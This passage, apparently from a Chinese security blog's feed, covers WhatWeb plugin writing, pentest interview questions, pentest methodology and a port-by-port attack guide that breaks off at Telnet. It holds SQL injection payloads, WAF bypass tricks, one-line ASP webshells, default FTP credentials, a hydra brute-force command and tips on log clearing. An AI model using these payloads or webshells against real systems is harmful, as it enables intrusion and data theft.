<p>whatweb <a href="http://www.baidu.com/">www.baidu.com</a> –log-xml=baidu.xml</p>
<p><strong>其他格式导出文件同理：</strong></p>
<p>–log-brief=FILE            简单的记录，每个网站只记录一条返回信息–log-verbose=FILE            详细输出–log-xml=FILE            返回xml格式的日志–log-json=FILE            以json格式记录日志–log-json-verbose=FILE            记录详细的json日志–log-magictree=FILE            xml的树形结构–log-object=FILE            ruby对象格式–log-mongo-database            mongo数据库格式</p>
<p>注：json格式需要安装json依赖sudo gem install json</p>
<p>Mongo格式需要安装mongo依赖sudo gem install json</p>
<p><strong>列出所有插件</strong></p>
<p>whatweb -l</p>
<p><strong>查看插件的具体信息</strong></p>
<p>whatweb –info-plugins=”插件名”</p>
<p>插件的开发语言为ruby，所以插件为.rb格式，插件的保存目录为/usr/share/whatweb/plugins，可以查看别人是怎么写插件的。</p>
<p><strong>编写whatweb插件</strong></p>
<p>whatweb对国内的网站识别不是很友好，我们可以自己写插件，兼容更多国内的网站。</p>
<p>whatweb的官方模板：</p>
<p>Plugin.define “Plugin-Template” do    author “Enter Your Name”    version “0.1”    description “Describe what the plugin identifies. Include the homepage of the software package”    examples %w| include-some.net example-websites.com here.com |     # a comment block here is a good place to make notes for yourself and others      # There are four types of matches: regexp, text, ghdb     # Matches are enclosed in {} brackets and separated by commas     matches [    {:name=&gt;”a brief description of the match, eg. powered by in footer”,    :certainty=&gt;100, # 100 is certain, 75 is probably and 25 is maybe. if omitted, it defaults to 100.     :regexp=&gt;/This page was generated by <a href="http://www.genericcms.com//en//products//generic-cms//&quot;&gt;Generic">http://www.genericcms.com\/en\/products\/generic-cms\/&quot;&gt;Generic</a> CMS&lt;/a&gt;/ },    {:name=&gt;”title”,    :certainty=&gt;75,    :text=&gt;”<title>Generic Homepage</title>“ }    ]    end</p>
<p>语法解释：</p>
<p>第一行定义的为插件的名字，可以直接在命令行中使用。</p>
<p>命令行测试：</p>
<p>./whatweb -p drupal <a href="http://www.example.com/">www.example.com</a></p>
<p>第二行作者，第三行版本，第四行插件描述，第五行，插件所使用网站的例子</p>
<p>第五行是一个matchs列表，也是whatweb的关键，里边定义了一些匹配规则</p>
<p>{:name=&gt;”meta generator tag”, : 包含匹配的文件名称，这个文件必须是网站中唯一存在的文件。</p>
<p>:regexp=&gt; 是包含的要匹配的模式，它是一个正则表达式，可以有以下选项：</p>
<p>:regexp标准的 ruby 正则表达式:text 字符:ghdb google hack 数据库，包含以下几个模式inurl:包含的字符串在 urlintitle:包含的字符串在 titlefiletype:包含的文件名，如 PDF, JPG, RB 等:md5 请求页面的 md5 hash 值:tagpattern html 标签:version 可以设置正则表达式或直接字符串匹配:string 可以设置正则表达式或直接字符串匹配:filepath 可以设置正则表达式或直接字符串匹配，通常显示系统错误或配置文件等:account 经常用在登陆页面或用户列表等:module 可以设置正则表达式或直接字符串匹配，如网络设备可能使用了一个ruby 模块等:model 可以设置正则表达式或直接字符串匹配:firmware 可以设置正则表达式或直接字符串匹配，设备的固件版本</p>
<p>了解以上选项我们可以写出一个简单的识别dedecms的插件，如下</p>
<p>Plugin.define “DedeCMS” doauthor “xxxxx”version “0.1”description “dedecms - homepage:<a href="http://www.dedecms.com/&quot;">http://www.dedecms.com/&quot;</a> # Examples # examples %w|<a href="http://www.dedecms.com|/">www.dedecms.com|</a> matches [ # Version detection # Powered by text {:name=&gt;”Powered by DedeCms”,:regexp=&gt;/Powered by .<em>DedeCMS.</em>/}]end</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透思路</title>
    <url>/2019/11/29/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>注意：分割线下面内容来自知乎，原文来自I春秋</p>
<p>第一，搜集目标网站信息。windows下用爱站whois去查相关信息。kali用whois + url去查。</p>
<p>第二，查旁站。</p>
<p>第三，查目标网站真实IP，有的网站有CDN，无法知道真实IP，所以，利用多ping去判断分析真实IP。</p>
<p>第四，知道真实IP，就可以端口扫描，看一些敏感端口。要么端口爆破，要么嗅探。</p>
<p><strong>1)信息收集，</strong></p>
<p>1，获取域名的whois信息,获取注册者邮箱姓名电话等。</p>
<p>2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
<p>3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
<p>4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
<p>5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
<p>6，google hack 进一步探测网站的信息，后台，敏感文件</p>
<p><strong>2）漏洞扫描</strong></p>
<p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，</p>
<p>远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
<p>3）漏洞利用</p>
<p>利用以上的方式拿到webshell，或者其他权限</p>
<p>4）权限提升</p>
<p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，</p>
<p>linux藏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
<ol start="5">
<li>日志清理</li>
</ol>
<p>6）总结报告及修复方案</p>
<p><strong>sqlmap，怎么对一个注入点注入？</strong></p>
<p>1）如果是get型号，直接，sqlmap -u “诸如点网址”.</p>
<ol start="2">
<li>如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”</li>
</ol>
<p>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用*号替换，放到文件里，然后sqlmap -r “文件地址”</p>
<p><strong>nmap，扫描的几种方式</strong></p>
<p><strong>sql注入的几种类型？</strong></p>
<p>1）报错注入</p>
<p>2）bool型注入</p>
<p>3）延时注入</p>
<p>4）宽字节注入</p>
<p><strong>报错注入的函数有哪些？</strong></p>
<p>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-</p>
<p>2）通过floor报错 向下取整</p>
<p>3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</p>
<p>4）.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</p>
<p>5）.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</p>
<p>6）.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</p>
<p>7）.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</p>
<p>8）.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</p>
<p>9）.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</p>
<p>10）.exp()select * from test where id=1 and exp(~(select * from(select user())a));</p>
<p>延时注入如何来判断？</p>
<p>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
<p><strong>盲注和延时注入的共同点？</strong></p>
<p>都是一个字符一个字符的判断</p>
<p><strong>如何拿一个网站的webshell？</strong></p>
<p>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，</p>
<p>一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
<p><strong>sql注入写文件都有哪些函数？</strong></p>
<p>select ‘一句话’ into outfile ‘路径’</p>
<p>select ‘一句话’ into dumpfile ‘路径’</p>
<p>select ‘’ into dumpfile ‘d:\wwwroot[<a href="http://baidu.com](https://links.jianshu.com/go?to=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fbaidu.com)*\nvhack.php&#39;">http://baidu.com](https://links.jianshu.com/go?to=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fbaidu.com)*\nvhack.php&#39;</a>;*</p>
<p><strong>如何防止CSRF?</strong></p>
<p>1,验证referer</p>
<p>2，验证token</p>
<p>详细：<a href="https://links.jianshu.com/go?to=http://link.zhihu.com/?target=http://cnodejs.org/topic/5533dd6e9138f09b629674fd">浅谈cnode社区如何防止csrf攻击 - CNode技术社区</a></p>
<p><strong>owasp 漏洞都有哪些？</strong></p>
<p>1、SQL注入防护方法：</p>
<p>2、失效的身份认证和会话管理</p>
<p>3、跨站脚本攻击XSS</p>
<p>4、直接引用不安全的对象</p>
<p>5、安全配置错误</p>
<p>6、敏感信息泄露</p>
<p>7、缺少功能级的访问控制</p>
<p>8、跨站请求伪造CSRF</p>
<p>9、使用含有已知漏洞的组件</p>
<p>10、未验证的重定向和转发</p>
<p><strong>SQL注入防护方法？</strong></p>
<p>1、使用安全的API</p>
<p>2、对输入的特殊字符进行Escape转义处理</p>
<p>3、使用白名单来规范化输入验证方法</p>
<p>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符</p>
<p>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
<p><strong>代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
<p>1，代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<p>img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</p>
<p>src指定一个远程的脚本文件，获取referer</p>
<p>img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</p>
<p>1,远程服务器修改apache配置文件，配置.jpg文件以php方式来解析</p>
<p>AddType application/x-httpd-php .jpg</p>
<p>会以php方式来解析</p>
<p><strong>代码审计</strong></p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<p><strong>绕过waf</strong></p>
<p>1、关键字可以用%（只限IIS系列）。比如select，可以sel%e%ct。原理：网络层waf对SEL%E%CT进行url解码后变成SEL%E%CT，匹配select失败，而进入asp.dll对SEL%E%CT进行url解码却变成select。IIS下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤掉09-0d（09是tab键,0d是回车）、20（空格）、%(后两个字符有一个不是十六进制)字符。xss也是同理。</p>
<p>2、通杀的，内联注释。安全狗不拦截，但是安全宝、加速乐、D盾等，看到/<em>!/就Fack了，所以只限于安全狗。比如：/</em>!select*/</p>
<p>3、编码。这个方法对waf很有效果，因为一般waf会解码，但是我们利用这个特点，进行两次编码，他解了第一次但不会解第二次，就bypass了。腾讯waf、百度waf等等都可以这样bypass的。</p>
<p>4，绕过策略一：伪造搜索引擎</p>
<p>早些版本的安全狗是有这个漏洞的，就是把User-Agent修改为搜索引擎</p>
<p>5，360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截</p>
<p>\1. GET /pen/news.php?id=1 union select user,password from mysql.user</p>
<p>\1. GET /pen/news.php/admin?id=1 union select user,password from mysql.user</p>
<p>\1. GET /pen/admin/..\news.php?id=1 union select user,password from mysql.user</p>
<p>6，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF。</p>
<p>7，参数绕过，复制参数，id=1&amp;id=1</p>
<p>用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在sqlserver中可以用/**/代替空格</p>
<p>8,内联注释，</p>
<p>文件上传，复制文件包一份再加一份</p>
<p>在 form-data;后面增加一定的字符</p>
<p>宽字符注入</p>
<p>宽字符：解 决方法：就是在初始化连接和字符集之后，使用SET character_set_client=binary来设定客户端的字符集是二进制的。修改Windows下的MySQL配置文件一般是 my.ini，Linux下的MySQL配置文件一般是my.cnf，比如：mysql_query(“SETcharacter_set_client=binary”);。character_set_client指定的是SQL语句的编码，如果设置为 binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。</p>
<p>渗透测试思路</p>
]]></content>
  </entry>
  <entry>
    <title>渗透步骤</title>
    <url>/2019/12/20/%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<p>渗透测试步骤：<strong>渗透测试与入侵的最大区别</strong></p>
<p>渗透测试：出于保护系统的目的，更全面地找出测试对象的安全隐患。</p>
<p>入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。</p>
<p><strong>一般渗透测试流程</strong></p>
<p><img src="/image/%E6%B5%81%E7%A8%8B.jpg"></p>
<p>流程并非万能，只是一个工具。思考与流程并用，结合自己经验。</p>
<p><strong>2.1</strong> <strong>明确目标</strong></p>
<p>确定范围：测试目标的范围，ip，域名，内外网</p>
<p>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等。</p>
<p>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</p>
<p>根据需求和自己技术能力来确定能不能做，能做多少。</p>
<p><strong>2.2</strong> <strong>信息收集</strong></p>
<p>方式：主动扫描，开放搜索等</p>
<p>开放搜索：利用搜索引擎获得，后台，未授权页面，敏感url等。</p>
<p>基础信息：IP，网段，域名，端口</p>
<p>系统信息：操作系统版本</p>
<p>应用信息：各端口的应用，例如web应用，邮件应用等等</p>
<p>版本信息：所有这些探测到的东西的版本。</p>
<p>服务信息</p>
<p>人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等。</p>
<p>防护信息：试着看能否探测到防护设备</p>
<p><strong>2.3</strong> <strong>漏洞探索</strong></p>
<p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p>
<p>方法：</p>
<p>1.漏扫，awvs，IBM</p>
<p>appscan等。</p>
<p>2.结合漏洞去exploit-db等位置找利用。</p>
<p>3.在网上寻找验证poc。</p>
<p><strong>内容：</strong></p>
<p>系统漏洞：系统没有及时打补丁</p>
<p>Websever漏洞：Websever配置问题</p>
<p>Web应用漏洞：Web应用开发问题</p>
<p>其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</p>
<p>通信安全：明文传输，token在cookie中传送等。</p>
<p><strong>2.4</strong> <strong>漏洞验证</strong></p>
<p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p>
<p>自动化验证：结合自动化扫描工具提供的结果</p>
<p>手工验证，根据公开资源进行验证</p>
<p>试验验证：自己搭建模拟环境进行验证</p>
<p>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</p>
<p>业务漏洞验证：如发现业务漏洞，要进行验证</p>
<p>公开资源的利用</p>
<p>-exploit-db/wooyun/</p>
<p>-google</p>
<p>hacking</p>
<p>-渗透代码网站</p>
<p>-通用、缺省口令</p>
<p>-厂商的漏洞警告等等。</p>
<p><strong>2.5</strong> <strong>信息分析</strong></p>
<p>为下一步实施渗透做准备。</p>
<p>精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</p>
<p>绕过防御机制：是否有防火墙等设备，如何绕过</p>
<p>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</p>
<p>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</p>
<p>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p>
<p><strong>2.6</strong> <strong>获取所需</strong></p>
<p>实施攻击：根据前几步的结果，进行攻击</p>
<p>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</p>
<p>进一步渗透：内网入侵，敏感目标</p>
<p>持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</p>
<p>清理痕迹：清理相关日志（访问，操作），上传文件等</p>
<p><strong>2.7</strong> <strong>信息整理</strong></p>
<p>整理渗透工具：整理渗透过程中用到的代码，poc，exp等</p>
<p>整理收集信息：整理渗透过程中收集到的一切信息</p>
<p>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</p>
<p>目的：为了最后形成报告，形成测试结果使用。</p>
<p><strong>2.8</strong> <strong>形成报告</strong></p>
<p>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</p>
<p>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</p>
<p>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</p>
<p><strong>2.9</strong> <strong>流程总结</strong></p>
<p><img src="/image/%E6%80%BB%E7%BB%93.jpg"></p>
<p><strong>渗透测试相关名词解析</strong></p>
<p><strong>1.1</strong> <strong>一些前置知识（包含但不限于）</strong></p>
<p>脚本（asp、php、jsp）</p>
<p>html（css、js、html）</p>
<p>HTTP协议</p>
<p>CMS（B/S）</p>
<p><strong>1.2</strong> <strong>肉鸡</strong></p>
<p>被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</p>
<p><strong>1.3</strong> <strong>抓鸡</strong></p>
<p>利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为。</p>
<p><strong>1.4 Webshell</strong></p>
<p>通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。</p>
<p><strong>1.5</strong> <strong>漏洞</strong></p>
<p>硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p>
<p><strong>1.6</strong> <strong>木马</strong></p>
<p>通过向服务端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p>
<p>&lt;%eval</p>
<p>request(“pass”)%&gt;</p>
<p>&lt;%execute(request(“pass”))%&gt;</p>
<p>request(“pass”)接收客户端提交的数据，pass为执行命令的参数值。</p>
<p>eval/execute   函数执行客户端命令的内容</p>
<p><strong>1.7</strong> <strong>提权</strong></p>
<p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p>
<p><strong>1.8</strong> <strong>后门</strong></p>
<p>黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p>
<p><strong>1.9</strong> <strong>跳板</strong></p>
<p>使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息。</p>
<p><strong>1.10</strong> <strong>旁站入侵</strong></p>
<p>即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等</p>
<p><strong>1.11 C**</strong>段入侵**</p>
<p>即同C段下服务器入侵。如目标ip为192.168.180.253 入侵192.168.180.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit, Snoop, Tcpdump, Dsniff 等。</p>
<p><strong>1.12</strong> <strong>黑盒测试</strong></p>
<p>在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。</p>
<p>黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Datebase、Script、code、思路、社工）。思路与经验积累往往决定成败。</p>
<p><strong>1.13</strong> <strong>白盒测试</strong></p>
<p>相对黑盒测试，白盒测试基本是从内部发起。白盒测试与黑盒测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片断，也能够与单位的其它员工（销售、程序员、管理者……）进行面对面的沟通。</p>
<p><strong>1.13</strong> <strong>黑白盒的另一种说法</strong></p>
<p>知道源代码和不知道源代码的渗透测试。这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p>
<p><strong>1.14 APT**</strong>攻击**</p>
<p>Advanced</p>
<p>Persistent Threat，高级可持续性攻击，是指组织(特别是政府)或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。</p>
<p>1.极强的隐蔽性</p>
<p>2.潜伏期长，持续性强</p>
<p>3.目标性强</p>
]]></content>
  </entry>
  <entry>
    <title>常见端口及其漏洞</title>
    <url>/2020/05/17/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="常见端口及其漏洞"><a href="#常见端口及其漏洞" class="headerlink" title="常见端口及其漏洞"></a>常见端口及其漏洞</h1><ul>
<li><a href="https://www.cnblogs.com/lgf01010/articles/9610411.html">https://www.cnblogs.com/lgf01010/articles/9610411.html</a></li>
</ul>
<hr>
<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>在前段时间的渗透中，我发现通过端口来进行渗透有时会提升我们的效率，所以才有了这篇文章的诞生；</p>
<p>首先分享一份关于端口及他们对应的服务文件：<a href="https://yunpan.cn/cYyNXEpZNYvxQ">https://yunpan.cn/cYyNXEpZNYvxQ</a> 访问密码 983e</p>
<p>这里再分享一篇我曾经在百度文库提交的端口渗透文章：<a href="http://wenku.baidu.com/link?url=MU3cdO_O5c5NLqHoAHx5c5w1UKReC9ae60zEL2WUDnWeRY3tlszySORF4ZUSN8QYKp1QH_fzxCUwt7UwBPE0-VJXoBol-ZxRrScgLpqqfoe">请点我</a></p>
<p>再次看这篇文章发现写的很简单，也只描述了几个常见的端口渗透；而且一般我们都是可以修 改默认端口的，所以平时在渗透过程中，对端口信息的收集就是一个很重要的过程；然后对症下药就可以更快的渗透进入我们需要的服务器；接下来就详细通过渗透 实战对端口的渗透进行更加深入的剖析；</p>
<p>端口渗透过程中我们需要关注几个问题：</p>
<p>1、  端口的banner信息</p>
<p>2、  端口上运行的服务</p>
<p>3、  常见应用的默认端口</p>
<p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p>
<h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
<p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p>
<p>还需要注明的一点是：很多木马工具也有特定的端口，本文并没有涉及到这块的内容，大家可以自己去收集收集！</p>
<h2 id="关于爆破之我见"><a href="#关于爆破之我见" class="headerlink" title="关于爆破之我见"></a>关于爆破之我见</h2><p>在对这些端口进行实战讲解时，我需要先阐述一下我对爆破这个方式的一些看法；</p>
<p>爆破：技术最简单，需要的技术能力基本为0，工作效率与网络、硬件等相关，在我看来爆破其实是最强大的攻击方式，特别是结合一些特制的字典，结合社工我们可以在很短的时间达到最大的效果，只不过因为我们的pc或者字典不够强大，所以很多时候我们不能进行一次优秀的爆破攻击；当然现在很多web应用以及服务端口都限制了暴力破解；对于这种做了限制的我们可能就需要利用到本文提到的其他攻击了！</p>
<p>分享一个团队sai总结的字典：<a href="http://www.heysec.org/archives/478">请点击</a></p>
<p>声明：本文总结的都是近两年的常见漏洞，以前的老版漏洞以及危害性不大的漏洞没有总结，望大家谅解！</p>
<h1 id="0x01-实战测试"><a href="#0x01-实战测试" class="headerlink" title="0x01 实战测试"></a>0x01 实战测试</h1><h2 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h2><h3 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<p>攻击方式：</p>
<p>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/">Bruter</a>以及msf中ftp爆破模块；</p>
<p>匿名访问：用户名：anonymous  密码：为空或任意邮箱</p>
<p>用户名：FTP            密码：FTP或为空</p>
<p>用户名：USET         密码：pass</p>
<p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p>
<p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/03/0.png"><img src="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/03/0.png" alt="0"></a></p>
<p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p>
<p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/03/01.png"><img src="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/03/01.png" alt="01"></a></p>
<p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细<a href="http://www.freebuf.com/articles/system/34571.html">请点击</a></p>
<p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p>
<p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。（注：此种情况小白并没有遇到过，只是总结一下，欢迎大牛指教）</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0116499">山东电信Serv-U Web客户端弱口令</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102552">长虹ftp弱口令导致全网数据泄漏</a></p>
<h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h3><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<p>默认端口：2049</p>
<p>攻击方式：</p>
<p>未授权访问：未限制IP以及用户权限设置错误</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/8659">Nfs配置不当导致被入侵</a></p>
<p><a href="http://www.360doc.com/content/11/0410/14/2054285_108598426.shtml">NFS服务全攻略</a></p>
<h3 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h3><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p>
<p>未授权访问：给予public用户高权限</p>
<p>远程代码执行漏洞：CVE-2015-0240等等</p>
<p>案例分享：</p>
<p><a href="http://www.secpulse.com/archives/5975.html">Samba远程代码执行漏洞</a></p>
<p><a href="http://tech.soft6.com/667/10/45861.html">未授权访问文件系统漏洞</a></p>
<h3 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h3><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<p>默认端口：389</p>
<p>攻击方式：</p>
<p>注入攻击：盲注</p>
<p>未授权访问：</p>
<p>爆破：弱口令</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/967">LDAP注入与防御剖析</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-051234">欧朋LDAP服务匿名访问</a></p>
<p><a href="http://drops.wooyun.org/pentesting/2125">使用LDAP查询快速提升域权限</a></p>
<h2 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h2><h3 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h3><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<p>默认端口：22</p>
<p>攻击方式</p>
<p>爆破：弱口令、</p>
<p>漏洞：28退格漏洞、OpenSSL漏洞</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0135530">安宇创新科技ssh弱口令</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0154829">宜信贷某站存在OpenSSL漏洞</a></p>
<h3 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h3><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<p>默认端口：23</p>
<p>攻击方式</p>
<p>爆破：弱口令</p>
<p>嗅探：此种情况一般发生在局域网；</p>
<p>案例分享：</p>
